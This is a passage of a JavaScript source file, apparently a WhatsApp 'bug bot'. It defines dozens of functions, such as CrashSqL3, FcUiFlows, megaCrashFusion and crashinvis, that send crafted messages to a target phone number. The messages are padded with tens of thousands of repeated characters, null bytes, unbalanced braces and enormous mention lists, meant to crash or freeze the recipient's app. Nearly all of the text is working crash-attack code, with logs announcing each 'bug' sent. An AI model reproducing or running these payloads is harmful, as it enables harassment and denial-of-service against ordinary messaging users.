            groupSubject: "PhenoxScary",
            jpegThumbnail: "RenzIsHere",
            groupMetaData: {
              creationTimestamp: Date.now(),
              ownerJid: "0@s.whatsapp.net",
              adminJids: [
              "0@s.whatsapp.net",
              "0@s.whatsapp.net"
              ],
            }
          }
        },
          
          externalAdReply: {

          title: "PhenoxScary" + "@1".repeat(55000),

          body: "꧀".repeat(55000),

          mediaType: 1,

          thumbnail: "img2",

          sourceUrl: "https://t.me/RapzXyzz",

        },
          
        sourceId: sock.generateMessageTag(),
        isForwarded: true,
        forwardingScore: 99999,
        stanzaId: "",
      }
    };

    await sock.sendMessage(target, messagePayload);

    console.log("✔ SuccesFulyy Sent !");
  } catch (err) {
    console.error("❌ Error:", err);
  }
}


async function CrashSqL3(target) {
  try {
    const messagePayload = {
      caption: "Getsuzo Company ",

      contextInfo: {
        mentionedJid: [

        target,

        "0@s.whatsapp.net",

          ...Array.from({ length: 20 }, (_, i) => `1000000000${i}@s.whatsapp.net`)

        ],
        participant: target,
          remoteJid: "status@broadcast",

        quotedMessage: {
                  externalAdReply: {

          title: "GetsuzoCompany" + "@1".repeat(55000),

          body: "꧀".repeat(55000),

          mediaType: 1,

          thumbnail: "img2",

          sourceUrl: "https://t.me/RapzXyzz",

        },
          groupStatusMentionMessage: {
            groupJid: target,
            groupSubject: "Getsuzo Company",
            jpegThumbnail: "RenzIsHere",
            groupMetaData: {
              creationTimestamp: Date.now(),
              ownerJid: "0@s.whatsapp.net",
              adminJids: [
              "0@s.whatsapp.net",
              "0@s.whatsapp.net"
              ],
            }
          }
        },
          
        sourceId: sock.generateMessageTag(),
        isForwarded: true,
        forwardingScore: 99999,
        stanzaId: "",
      }
    };

    await sock.sendMessage(target, messagePayload);

    console.log("✔ SuccesFulyy Sent !");
  } catch (err) {
    console.error("❌ Error:", err);
  }
}

async function SwQl(target) {
    const messageContent = {
        groupStatusMentionMessage: {
            text: "GetsuzonCompany!",
            mentionedJid: [
            target,
                    "0@s.whatsapp.net",

          ...Array.from({ length: 40 }, (_, i) => `1000000000${i}@s.whatsapp.net`)
          
            ],
            contextInfo: {
            remoteJid: "status@broadcast",
            participant: target,
                externalAdReply: {
                    title: "GetsuzoCompany" + "@1".repeat(55000),
                    body: "꧀".repeat(55000),
                    mediaType: 1, // 1=image, 2=video, dll
                    thumbnailUrl: "img23",
                    sourceUrl: "https://t.me/RapzXyzz"
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, messageContent);

    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

async function jjSqL(target) {
  try {
    const messagePayload = {
      extendedTextMessage: {
        text: "GetsuzonCompany ~!", // teks bisa tetap ada
        contextInfo: {
          externalAdReply: {
            title: "GetsuzoCompany" + "@1".repeat(55000),
            body: "꧀".repeat(55000),
            mediaType: 1, // 1=image, 2=video, dll
            thumbnail: "img2", // bisa diganti Buffer jika lokal
            sourceUrl: "https://t.me/RapzXyzz",
          },
          mentionedJid: [
          target,
             "0@s.whatsapp.net",

          ...Array.from({ length: 40 }, (_, i) => `1000000000${i}@s.whatsapp.net`)
          ],
          isForwarded: true,
          forwardingScore: 99999,
          sourceId: sock.generateMessageTag(),
          stanzaId: "",
        }
      }
    };

    await sock.sendMessage(target, messagePayload);

    console.log("✔ SuccesFulyy Sent !");
  } catch (err) {
    console.error("❌ Error:", err);
  }
}


async function SqLPdFFff(target) {
  try {
    const messagePayload = {
      text: "Getsuzo Company~",
      externalAdReply: {
        title: 'PhenoxScary' + '@1'.repeat(55000),
        body: '꧀'.repeat(55000),
        mediaType: 1,
        thumbnail: 'img2',
        contextInfo: {
        mentionedJid: [
          target,
             "0@s.whatsapp.net",

          ...Array.from({ length: 40 }, (_, i) => `1000000000${i}@s.whatsapp.net`)
          ],
          remoteJid: target,
        isForwarded: true,
        forwardingScore: 99999,
        sourceUrl: 'https://t.me/RapzXyzz',                
        },
      }
    };

    await sock.sendMessage(target, messagePayload);
    console.log("Succesfully Sent ✓");

    await sock.sendMessage(target, messagePayload);
    console.log('SuccesFully');
  } catch (err) {
    console.error('❌ Error:', err);
  }
}

async function CrashInfinite1(target) {
    try {
      const messagePayload = {
      contextInfo: {
      mentionedJid: [
      target,
      "0@s.whatsapp.net",

          ...Array.from({ length: 40 }, (_, i) => `1000000000${i}@s.whatsapp.net`)
      ],
      remoteJid: target,
      quotedMessage: {
      externalAdReply: {
      title: "GetSuzo Company ~" + "@1".repeat(5500),
      body: "@1".repeat(5500) + "꧀".repeat(5500),
      thumbnail: "img778",
      mediaType: 1,
      },
      stanzaId: "",
      sourceUrl: "https://t.me/RapzXyzz",
      isForwarded: true,
      forwardingScore: 99999,
      },
      },
    }
    
    await sock.relayMessage(target, messagePayload, {
    messageId: null,
    });
    console.log("SuccesFulyy Sent Bug");
  } catch (e) {
  console.error("Gagal Mengirim Bug", e);
  }
}

async function v(target) {
  try {
    const msg = await generateWAMessageFromContent(target, {
      message: {
        extendedTextMessage: {
          text: "Getsuzo Company ~",
          contextInfo: {
          isForwarded: true,
          forwardingScore: 9999999,
            externalAdReply: {
              title: "Getsuzo Company ~" + "@1".repeat(55000),
              body: "Powered by RenzXml" +  "꧀".repeat(55000),
              mediaType: 1,
              thumbnailUrl: "https://files.catbox.moe/msu4dk.jpg",
              mediaUrl: "https://t.me/RapzXyzz",
              thumbnail: Buffer.from([]),

              sourceType: "telegram",
              sourceId: sock.generateMessageTag(),
              sourceUrl: "https://t.me/RapzXyzz",

              containsAutoReply: true,
              renderLargerThumbnail: true,
              showAdAttribution: true,

              ctwaClid: "GETSUZO-CLID-9912",
              ref: "GETSUZO-REF-2233",

              clickToWhatsappCall: true,
              adContextPreviewDismissed: true,
              sourceApp: "Getsuzo Company ",

              automatedGreetingMessageShown: true,
              greetingMessageBody: "x ‼️~",

              ctaPayload: "AUTO_CTA_PAYLOAD_112233",
              disableNudge: true,

              originalImageUrl: "https://files.catbox.moe/msu4dk.jpg",
              automatedGreetingMessageCtaType: "AUTO",

              wtwaAdFormat: true,
              adType: 0,

              wtwaWebsiteUrl: "https://t.me/RapzXyzz",
              adPreviewUrl: "https://files.catbox.moe/kjue2w.jpg"
            }
          }
        }
      }
    });

    await sock.relayMessage(target, msg.message, {
      participant: { jid: target },
      messageId: msg.key.id
    });

    console.log("✓ SuccesFulyy sent!");

  } catch (e) {
    console.log("❌ ExternalAdReply Error:", e);
  }
}



async function FcUiFlows(target) {
  const mentionedJidList = [
    target,
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 2000 }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const Params = "{[(".repeat(20000);

  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "",
            hasMediaAttachment: false
          },
          body: {
            text: "GetSuzo Company"
          },
          nativeFlowMessage: {
            messageParamsJson: Params,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({ status: true })
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true })
              },
              {
                name: "send_location",
                buttonParamsJson: "{}"
              },
              {
                name: "payment_method",
                buttonParamsJson: ""
              },
              {
                name: "form_message",
                buttonParamsJson: ""
              },
              {
                name: "catalog_message",
                buttonParamsJson: ""
              },
              {
                name: "review_and_pay",
                buttonParamsJson: ""
              },
              {
                name: "mpm",
                buttonParamsJson: ""
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            forwardingScore: 250208,
            isForwarded: false,
            mentionedJid: mentionedJidList
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
  });

  await sleep(1);

  await sock.sendMessage(target, { delete: msg.key });
}

async function CrashInfinite(target) {
  try {

    const messagePayload = {
      contextInfo: {
        mentionedJid: [
          target,
          "0@s.whatsapp.net",
          ...Array.from({ length: 40 }, (_, i) => `1000000000${i}@s.whatsapp.net`)
        ],
        remoteJid: target,

        // externalAdReply HARUS disini (BUKAN di quotedMessage)
        externalAdReply: {
          title: "GetSuzo Company ~" + "@1".repeat(2000),
          body: "@1".repeat(2000),
          mediaType: 1,
          thumbnail: Buffer.from([]), // thumbnail WAJIB buffer
          sourceUrl: "https://t.me/RapzXyzz"
        },

        isForwarded: true,
        forwardingScore: 99999
      },

      // quotedMessage hanya boleh groupStatusMentionMessage
      quotedMessage: {
        groupStatusMentionMessage: {
          groupJid: target,
          text: "@1".repeat(5000),
          participant: "0@s.whatsapp.net"
        }
      }
    };

    await sock.relayMessage(target, messagePayload, {
      messageId: null,
    });

    console.log("SuccesFulyy Sent Bug");

  } catch (e) {
    console.error("Gagal Mengirim Bug", e);
  }
}

async function sendStatusMentionSafe(target) {
  try {
    const messagePayload = {
      contextInfo: {
        isForwarded: true,
        forwardingScore: 999,

        quotedMessage: {
          groupStatusMentionMessage: {
            groupJid: target,
            groupSubject: "PhenoxScary",
            jpegThumbnail: "img77", 
            groupMetaData: {
              creationTimestamp: Date.now(),
              ownerJid: "0@s.whatsapp.net",
              adminJids: [
                "0@s.whatsapp.net",
                "0@s.whatsapp.net"
              ],
            }
          }
        },

        externalAdReply: {
          title: "GetSuzo Company ~" + "@1".repeat(55000),
          body: "Powered by RenzXml" +  "꧀".repeat(55000),
          mediaType: 1,
          thumbnail: "img77",
          sourceUrl: "https://t.me/RapzXyzz"
        }
      }
    };

    await sock.sendMessage(target, messagePayload);

    console.log("✔ Pesan aman terkirim!");
  } catch (err) {
    console.error("❌ Error:", err);
  }
}

async function X(target) {

  try {
    const meseg = {
      image: { url: "https://files.catbox.moe/msu4d.jpg" },
      caption: "Bjer",

      contextInfo: {
        mentionedJid: [

        target,

        "0@s.whatsapp.net",

          ...Array.from({ length: 20 }, (_, i) => `1000000000${i}@s.whatsapp.net`)

        ],
        participant: target,
          remoteJid: "status@broadcast",

        quotedMessage: {
          groupStatusMentionMessage: {
            groupJid: m.chat,
            groupSubject: "Try",
            jpegThumbnail: "DEX",
            groupMetaData: {
              creationTimestamp: Date.now(),
              ownerJid: "0@s.whatsapp.net",
              adminJids: [
              "0@s.whatsapp.net",
              "0@s.whatsapp.net"
              ],
            }
          }
        },
          
          externalAdReply: {

          title: "XML" + "@1".repeat(55000),

          body: "꧀".repeat(55000),

          mediaType: 1,

          thumbnail: "img2",

          sourceUrl: "https://t.me/RaditX7",

        },
          
        sourceId: sock.generateMessageTag(),
        isForwarded: true,
        forwardingScore: 99999,
        stanzaId: "",
      }
    };

    await sock.sendMessage(target, meseg);
    console.log(`X ${target}`);
  } catch (err) {
    console.error(`❌`, err);
  }
}

async function c(target) {
  try {
    const payload = {
      messageAddOn: {
        messageAddOnType: 4, // REACTION

        // Pesan tambahan yang disertakan (Message)
        messageAddOn: {
          conversation: "Getsuzo Company ~"
        },

        senderTimestampMs: Date.now(),
        serverTimestampMs: Date.now(),

        status: 1,

        addOnContextInfo: {
          addOnId: "XML",
          addOnName: "RenzXml"
        },

        messageAddOnKey: {
          remoteJid: target,
          fromMe: true,
          id: "XML" + Date.now()
        },

        legacyMessage: {
          conversation: "Getsuzo Company ~"
        }
      }
    };

    const waMsg = await generateWAMessageFromContent(target, payload, {});
    await sock.relayMessage(target, waMsg.message, { messageId: waMsg.key.id });

    return waMsg;

  } catch (err) {
    console.error("Error sending MessageAddOn:", err);
  }
}

async function Xii(target) {
  try {
    const messagePayload = {
    contextInfo: {
    mentionedJid: [
      target,
      "0@s.whatsapp.net",

          ...Array.from({ length: 99999999 }, (_, i) => `1000000000${i}@s.whatsapp.net`)
      ],
      participant: target,
      remoteJid: "status@broadcast",
      externalAdReply: {
      title: "Getsuzo Company\n\n" + "@1".repeat(67189),
      body: "@5" + "\u0000".repeat(55000),
      thumbnail: "Img77",
      mediaType: 1,
      },
      quotedMessage: {
      groupInviteMessage: {
      groupJid: target,
      groupName: "XML",
      inviteCode: "1",
      inviteExpiration: Date.now() + 9000,
      jpegThumbnail: "img77",
      caption: "Getsuzo Company ~",
      },
      groupStatusMentionMessage: {
      groupJid: target,
      creatorTimeStamp: Date.now(),
      groupMetaData: {
      adminJids: [
      "0@s.whatsapp.net",
      "0@s.whatsapp.net"
      ],
      ownerJid: "0@s.whatsapp.net",
      }
      }
      },
     },
    }
    await sock.sendMessage(target, messagePayload);
    console.log("X");
  } catch (eror) {
  console.error("‼️", eror);
  }
}

async function CreatePollV4Message(target) {
  try {

    const payload = {
      message: {

        // Struktur pollCreationMessageV4 tetap seperti sebelumnya
        pollCreationMessageV4: {
          poll: {
            name: "Getsuzo Company ~",
            options: [
              { optionName: "XML" },
              { optionName: "GETSUZO" },
              { optionName: "GetXml" },
            ],
            selectableOptionsCount: 9999,
          }
        },

        // contextInfo + externalAdReply ditambahkan di sini
        contextInfo: {
          remoteJid: target,
          mentionedJid: [
            target,
            "0@s.whatsapp.net",
            ...Array.from({ length: 9999 }, (_, i) => `1000000000${i}@s.whatsapp.net`)
          ],

          isForwarded: true,
          forwardingScore: 2326,

          // ⬇️ externalAdReply tambahan
          externalAdReply: {
            title: "Getsuzo Company ~",
            body: "Powered by Getsuzo System" + "꧀".repeat(55000),
            mediaType: 1,
            thumbnailUrl: "https://files.catbox.moe/msu4dk.jpg",
            sourceUrl: "https://google.com",
            renderLargerThumbnail: true
          }
        }

      }
    };

    await sock.sendMessage(target, payload);
    return payload;

  } catch (err) {
    console.error("Error membuat pollCreationMessageV4:", err);
    return null;
  }
}

async function iosXnd(target) {
  let msg = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      contextInfo: {
        statusAttributionType: "RESHARED_FROM_POST"
      }, 
      text: "🧪⃟꙰。⃝𝟕𝐞𝐩𝐩 𝐞𝐥𝐢‌⃰ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️" + "𑇂𑆵𑆴𑆿".repeat(60000), 
      matchedText: "t.me/YuukeyD7eppeli", 
      groupInviteLinkType: "DEFAULT"
    }
  }, {});
  
  await Yuukey.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid:target },
  });
}

async function b(target) {
  try {
    const messagePayload = {
      text: "Getsuzo⃟‼️",

      contextInfo: {
        isForwarded: true,
        forwardingScore: 990,
        mentionedJid: [
            target,
            "0@s.whatsapp.net",
            ...Array.from({ length: 9999 }, (_, i) => `1000000000${i}@s.whatsapp.net`)
          ],
          remoteJid: target,

        externalAdReply: {
          title: "Getsuzo⃟‼️",
          body: "Getsuzo Company" + "꧀".repeat(55000),
          mediaType: 1,
          thumbnailUrl: "https://files.catbox.moe/msu4dk.jpg",
          sourceUrl: "https://t.me/RapzXyzz",  
          renderLargerThumbnail: true,
        }
      }
    };

    await sock.sendMessage(target, messagePayload);
    console.log("✔ Sent");
  } catch (err) {
    console.error("❌ Error:", err);
  }
}



async function crashtest(target) {
  // Objek 'sock' diasumsikan sudah tersedia di lingkup ini
  if (!sock) {
      console.error("Error: Objek koneksi 'sock' tidak tersedia di lingkup global.");
      return;
  }

  try {
    const quotedGroupInvite = {
      groupInviteMessage: {
        groupJid: target,
        groupSubject: "ALL_CHAT",
        inviteCode: "12",
        inviteExpiration: Date.now() + (24 * 60 * 60 * 1000), 
        groupType: "DEFAULT",
        adminJid: "13135550002@s.whatsapp.net",
      },
    };

    const contextInfoData = {
      sourceId: sock.generateMessageTag(),
      isForwarded: true,
      forwardingScore: 2325,
      businessForwardingInfo: {
        businessOwnerJid: "13135550002@s.whatsapp.net",
      },
      quotedMessage: quotedGroupInvite, 
    };

    const mediaContent = {
      image: { url: "https://files.catbox.moe/kjue2w.jpg" },
      caption: "It`sMe Renzze",
      contextInfo: contextInfoData,
    };
    
    const viewOnceMessageContent = {
        viewOnce: {
            message: mediaContent
        }
    };

    const mediaMessage = await generateWAMessage(
      target, 
      viewOnceMessageContent, 
      {
          messageId: sock.generateMessageTag(),
          userJid: sock.user.id,
          quoted: null, 
      }
    );

    await sock.relayMessage(target, mediaMessage.message, {
      messageId: mediaMessage.key.id
    });

    console.log("SuccesFulyy Sent View Once Message 😈");
  } catch (err) {
    console.error("Gagal Mengirim Pesan Sekali Lihat:", err);
  }
}


async function zox(target) {
  // Objek 'sock' diasumsikan sudah tersedia di lingkup ini
  if (!sock) {
      console.error("Error: Objek koneksi 'sock' tidak tersedia.");
      return;
  }

  // --- 1. Unduh Gambar ke Buffer (Pencegahan Error 'Invalid Media type') ---
  let imageBuffer;
  try {
      console.log(`[Media] Mengunduh gambar dari ${imageUrl}...`);
      const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
      imageBuffer = Buffer.from(response.data, 'binary');
      console.log("[Media] Gambar berhasil diunduh.");
  } catch (downloadError) {
      console.error("❌ Gagal mengunduh gambar:", downloadError.message);
      // Kirim pesan teks sederhana ke pengguna jika gagal mengunduh media
      await sock.sendMessage(target, { text: "Error: Gagal memuat gambar untuk pesan." });
      return;
  }

  try {
    // 2. Buat Teks Terpotong ('Baca selengkapnya')
    // Karakter pemisah yang panjang untuk memicu efek pemotongan
    const separator = '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'; 
    const finalCaption = visibleText + separator + hiddenText;

    // 3. Definisikan Context Info (Termasuk Label AI)
    const contextInfoData = {
        // Mengatur isLlm: true akan menampilkan label "AI" pada pesan
        isForwarded: true, 
        forwardingScore: 10,
        // Anda dapat menambahkan metadata lain di sini (misalnya, isForwarded: true)
    };

    // 4. Buat Objek Pesan Gambar
    const mediaContent = {
        image: imageBuffer, // Menggunakan buffer gambar yang sudah diunduh
        caption: finalCaption,
        contextInfo: contextInfoData,
    };
    
    // 5. Generate Message Content
    const mediaMessage = await generateWAMessage(
      target, 
      mediaContent, 
      {
          messageId: sock.generateMessageTag(), 
          userJid: sock.user.id, 
          quoted: null, 
      }
    );

    // 6. Relay Message (Mengirim pesan)
    await sock.relayMessage(target, mediaMessage.message, {
      messageId: mediaMessage.key.id
    });

    console.log(`Successfully sent AI Image with Read More to ${target}`);
  } catch (err) {
    console.error("❌ Terjadi kesalahan saat mengirim pesan:", err);
  }
}

async function Scary(target) {
  try {
    const messagePayload = {
    image: { url: "https://files.catbox.moe/msu4dk.jpg" },
    caption: "\n\n\n\n\n\n".repeat(2300),
    contextInfo: {
    mentionedJid: [
      target,
      "0@s.whatsapp.net",

          ...Array.from({ length: 9999 }, (_, i) => `1000000000${i}@s.whatsapp.net`)
      ],
      quotedMessage: {
       groupStatusMentionMessage: {
      groupJid: target,
      creatorTimeStamp: Date.now(),
      groupMetaData: {
      adminJids: [
      "0@s.whatsapp.net",
      "0@s.whatsapp.net"
      ],
      ownerJid: "0@s.whatsapp.net",
      }
      }
      },
      participant: target,
      remoteJid: "1@newsletter",
      isForwarded: true,
      forwardingScore: 233,
     },
    }
    await sock.sendMessage(target, messagePayload);
    console.log("X");
  } catch (eror) {
  console.error("‼️", eror);
  }
}

async function JtwForcloseX(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 9999999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: { 
              text: `Getsuzo Company 🩸`
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(5000),
              buttons: [
                {
                  name: "payment_method",
                  buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0000".repeat(0x2710)},\"payment_timestamp\":null,\"share_payment_status\":true}`,
                },
              ],
            },
          },
        },
      },
    };
    await sock.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}

async function SendEventMessage(target) {
  try {
    const eventPayload = {
      eventMessage: {
        contextInfo: {
          mentionedJid: [target],
          isForwarded: true,
        },

        isCanceled: false, // true = dibatalkan
        name: "Grand Opening Event",
        description: "Getsuzo Company",

        location: {
          degreesLatitude: -9.911999999,    
          degreesLongitude: 109.9999999,
          name: "Getsuzo Company🩸" + "꧀".repeat(55000),
          address: `https://${"꧀".repeat(5500)}`,
        },

        joinLink: "https://Wa.me/stickerpack/getsuzo", // opsional
        startTime: Date.now() + 3600 * 10000 // 1 jam dari sekarang
      }
    };

    const msg = await generateWAMessageFromContent(
      target,
      eventPayload,
      {}
    );

    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
    console.log(`X ${target}`);

  } catch (err) {
    console.error("Error SendEventMessage:", err);
  }
}

async function DelayStick(target) {
  try {
    const msg = await generateMessageWAFromContent(target,{
    viewOnceMessage: {
      message: {
        body: {
        text: "Getsuzo"
        },
        contextInfo: {
          remoteJid: target,
          isForwarded: true,
          forwardingScore: 9999,
        nativeFlowMessage: {
          messageParamsJSON: "\u0000".repeat(2000),
          buttons: [
            {
            name: "galaxy_message",
           buttonParamsJson: "{\"flow_cta\":\"X\" ,\"flow_message_version\":\"3\"}"
            },
          ],
        },
       }
      },
    },
 });
    await sock.relayMessage(target, msg.message, {
      participant: { jid: target },
      messageId: msg.key.id
    });
    console.log("Succes Send Bug");
  } catch (e) {
    console.error("gagal mengirim bug", e);
  }
}

async function ZieeInvisForceIOS(target) {
  const msg = {
    message: {
      locationMessage: {
        degreesLatitude: 21.1266,
        degreesLongitude: -11.8199,
        name: "Z1ee - Tryhards ¿?" + "\u0000".repeat(70000) + "𑇂𑆵𑆴𑆿".repeat(60000),
        url: "https://github.com/urz1ee",
        contextInfo: {
          externalAdReply: {
            quotedAd: {
              advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
              caption: "@Urz1ee" + "𑇂𑆵𑆴𑆿".repeat(70000)
            },
            placeholderKey: {
              remoteJid: "0s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key?.id || Math.random().toString(36).slice(2),
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target }
              }
            ]
          }
        ]
      }
    ]
  });
}

async function megaCrashFusion(target) {
    const overButton = Array.from({ length: 9696 }, (_, r) => ({
        title: "᭄".repeat(9696),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const extremeNativeFlowButtons = [
        { name: "single_select", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "call_permission_request", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "cta_url", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "cta_call", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "cta_copy", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "cta_reminder", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "cta_cancel_reminder", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "address_message", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "send_location", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "quick_reply", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "mpm", buttonParamsJson: "\u0000".repeat(90000) },
    ];

    const combinedViewOncePayload = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "꓄ꍏꀘꍏ",
                    listType: 2,
                    buttonText: null,
                    sections: overButton,
                    singleSelectReply: { selectedRowId: "🪅" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 9696 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9696,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "9696@newsletter",
                            serverMessageId: 1,
                            newsletterName: "----default"
                        },
                        interactiveAnnotations: extremeNativeFlowButtons
                    },
                    description: "default"
                },
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "鈳� 饾悈 饾悽蜏廷蜖虌汀汀谈谭谭谭蜏廷 饾悕 饾悎 饾悧蜏廷-鈥�",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [{
                        embeddedContent: {
                            embeddedMusic: {
                                musicContentMediaId: "kontol",
                                songId: "peler",
                                author: ".Tama Ryuichi",
                                title: "Finix",
                                artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                countryBlocklist: true,
                                isExplicit: true,
                                artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                            }
                        }
                    }]
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const fused = generateWAMessageFromContent(target, combinedViewOncePayload, {});

    await sock.relayMessage("status@broadcast", fused.message, {
        messageId: fused.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    if (enableMention) {
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: fused.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    }
}

async function crashinvis(target) {
  try {
    const mentionedMetaAi = [
      "13135550001@s.whatsapp.net", "13135550002@s.whatsapp.net",
      "13135550003@s.whatsapp.net", "13135550004@s.whatsapp.net",
      "13135550005@s.whatsapp.net", "13135550006@s.whatsapp.net",
      "13135550007@s.whatsapp.net", "13135550008@s.whatsapp.net",
      "13135550009@s.whatsapp.net", "13135550010@s.whatsapp.net"
    ];
    const metaSpam = Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`);
    const textSpam = "᬴".repeat(250000);
    const mentionSpam = Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);
    const invisibleChar = '\u2063'.repeat(500000) + "@0".repeat(50000);
    const contactName = "🩸⃟ ༚ 𝑷𝒉𝒐𝒆𝒏𝒊𝒙⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰ͯཀ͜͡🦠-‣";
    const triggerChar = "𑇂𑆵𑆴𑆿".repeat(60000);
    const contactAmount = 200;
    const corruptedJson = "{".repeat(500000);
    const mention40k = Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`);
    const mention16k = Array.from({ length: 1600 }, () => `${Math.floor(1e11 + Math.random() * 9e11)}@s.whatsapp.net`);
    const randomMentions = Array.from({ length: 10 }, () => "0@s.whatsapp.net");

    await sock.relayMessage(target, {
      orderMessage: {
        orderId: "1228296005631191",
        thumbnail: { url: "https://files.catbox.moe/ykvioj.jpg" },
        itemCount: 9999999999,
        status: "INQUIRY",
        surface: "CATALOG",
        message: `${'ꦾ'.repeat(60000)}`,
        orderTitle: "🩸⃟ ༚ 𝑷𝒉𝒐𝒆𝒏𝒊𝒙⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰ͯཀ͜͡🦠-‣",
        sellerJid: "5521992999999@s.whatsapp.net",
        token: "Ad/leFmSZ2bEez5oa0i8hasyGqCqqo245Pqu8XY6oaPQRw==",
        totalAmount1000: "9999999999",
        totalCurrencyCode: "USD",
